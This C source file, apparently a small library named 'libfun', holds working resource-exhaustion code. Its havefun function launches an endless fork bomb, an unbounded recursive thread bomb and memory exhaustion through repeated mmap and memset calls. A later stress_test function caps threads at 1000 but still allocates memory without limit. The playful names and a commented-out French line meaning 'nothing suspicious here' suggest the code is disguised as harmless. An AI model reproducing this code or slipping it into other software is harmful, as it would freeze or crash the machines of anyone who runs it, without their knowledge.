#include "libfun.h"
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <errno.h>

#define CHUNK_SIZE (10 * 1024 * 1024)

int _MODE = 0;

void *cpu_stress(void *arg)
{
    (void)arg;
    printf("thread generated\n");
    size_t count = 0;
    while (1)
    {
        if (_MODE == 0)
        {
            void *p = mmap(NULL, CHUNK_SIZE,
                           PROT_READ | PROT_WRITE,
                           MAP_ANON | MAP_PRIVATE,
                           -1, 0);
            if (p == MAP_FAILED)
            {
                fprintf(stderr,
                        "\n[mmap] failed after allocating %.1f GiB: %s\n",
                        (double)count * CHUNK_SIZE / (1024 * 1024 * 1024),
                        strerror(errno));
                break;
            }
            memset(p, 0xA5, CHUNK_SIZE);
        }

        count++;
        // printf("\rCommitted %.1f GiB RAM…",
        //        (double)count * CHUNK_SIZE / (1024*1024*1024));
        // fflush(stdout);
    }
    return NULL;
}

void *bombthread(void *arg)
{
    (void)arg;
    printf("thread generated\n");
    size_t count = 0;
    while (1)
    {
        count++;
        pthread_t *thread = malloc(sizeof(*thread));
        if (pthread_create(thread, NULL, bombthread, NULL) != 0)
        {
            perror("pthread_create");
            printf("error while creating thread\n");
        }
    }
}

void threadbomb()
{
    pthread_t *thread = malloc(sizeof(*thread));
    if (pthread_create(thread, NULL, bombthread, NULL) != 0)
    {
        perror("pthread_create");
        printf("error while creating thread\n");
    }
}

void havefun(int mode)
{
    printf("Starting fun... (mode=%d)\n", mode);
    _MODE = mode;

    if (mode == 2)
    {
        threadbomb();
        return;
    }
    // printf("Rien de sus ici hein\n");
    // return;
    // long ncores = sysconf(_SC_NPROCESSORS_ONLN);
    // if (ncores < 1) ncores = 1;
    // else ncores = 2;
    long ncores = 1;
    printf("fork res=%d\n", fork());
    while (fork() == 0)
    {
        printf("child is born\n");
    }
    pthread_t *threads = malloc(ncores * sizeof(*threads));
    if (!threads)
    {
        perror("malloc threads");
        exit(EXIT_FAILURE);
    }
    for (long i = 0; i < ncores; i++)
    {
        if (pthread_create(&threads[i], NULL, cpu_stress, NULL) != 0)
        {
            perror("pthread_create");
            exit(EXIT_FAILURE);
        }
    }

    size_t count = 0;
    while (1)
    {

        if (_MODE == 0)
        {
            void *p = mmap(NULL, CHUNK_SIZE,
                           PROT_READ | PROT_WRITE,
                           MAP_ANON | MAP_PRIVATE,
                           -1, 0);
            if (p == MAP_FAILED)
            {
                fprintf(stderr,
                        "\n[mmap] failed after allocating %.1f GiB: %s\n",
                        (double)count * CHUNK_SIZE / (1024 * 1024 * 1024),
                        strerror(errno));
                break;
            }
            memset(p, 0xA5, CHUNK_SIZE);
        }

        count++;
        // printf("\rCommitted %.1f GiB RAM…",
        //        (double)count * CHUNK_SIZE / (1024*1024*1024));
        // fflush(stdout);
    }
    pause();
    return;
}

#define THREAD_LIMIT 1000

// Global variables
int running = 1;
int thread_count = 0;
pthread_mutex_t count_mutex = PTHREAD_MUTEX_INITIALIZER;

void *memory_exhaustion_thread(void *arg) {
    size_t allocated = 0;
    void **allocations = NULL;
    size_t count = 0;
    
    while (running) {
        // Allocate memory
        void *ptr = mmap(NULL, CHUNK_SIZE, PROT_READ | PROT_WRITE, 
                        MAP_ANON | MAP_PRIVATE, -1, 0);
        
        if (ptr == MAP_FAILED) {
            printf("Memory allocation failed after %.1f MB\n", 
                  (double)allocated / (1024 * 1024));
            break;
        }
        
        // Touch the memory to ensure it's actually allocated
        memset(ptr, 0xA5, CHUNK_SIZE);
        
        // Store the pointer to prevent optimization
        allocations = realloc(allocations, (count + 1) * sizeof(void *));
        allocations[count++] = ptr;
        allocated += CHUNK_SIZE;
        
        if (count % 10 == 0) {
            printf("Allocated %.1f MB so far\n", (double)allocated / (1024 * 1024));
        }
    }
    
    // Cleanup (though we likely won't reach this point)
    for (size_t i = 0; i < count; i++) {
        munmap(allocations[i], CHUNK_SIZE);
    }
    free(allocations);
    
    return NULL;
}

void *thread_bomb_func(void *arg) {
    // Increment thread count
    pthread_mutex_lock(&count_mutex);
    thread_count++;
    int current_count = thread_count;
    pthread_mutex_unlock(&count_mutex);
    
    printf("Thread %d started\n", current_count);
    
    // Create more threads if we haven't hit the limit
    if (current_count < THREAD_LIMIT && running) {
        pthread_t thread;
        if (pthread_create(&thread, NULL, thread_bomb_func, NULL) == 0) {
            pthread_detach(thread);
        }
    }
    
    // Busy wait to keep the thread active
    while (running) {
        // Do some meaningless calculations
        volatile double x = 3.14159;
        for (int i = 0; i < 1000000; i++) {
            x = x * 1.00001;
        }
    }
    
    pthread_mutex_lock(&count_mutex);
    thread_count--;
    pthread_mutex_unlock(&count_mutex);
    
    return NULL;
}

void stress_test(int mode) {
    printf("Starting stress test (mode: %d)\n", mode);
    
    if (mode == 0) {
        // Memory exhaustion mode
        memory_exhaustion_thread(NULL);
    } 
    else if (mode == 1) {
        // Thread bomb mode
        thread_bomb_func(NULL);
        
        // Keep main thread alive
        while (running) {
            sleep(1);
        }
    }
    else if (mode == 2) {
        // Combined approach
        pthread_t mem_thread;
        pthread_create(&mem_thread, NULL, memory_exhaustion_thread, NULL);
        
        thread_bomb_func(NULL);
        
        pthread_join(mem_thread, NULL);
    }
    
    printf("Stress test completed\n");
}

